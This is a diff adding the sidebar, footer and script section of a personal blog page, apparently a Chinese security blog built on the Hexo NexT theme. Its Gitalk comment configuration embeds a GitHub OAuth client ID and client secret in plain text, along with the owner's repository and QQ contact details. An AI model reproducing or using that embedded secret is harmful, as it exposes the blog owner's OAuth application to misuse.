+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'c79f2011d1f377546e0825f7d59cda3a',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
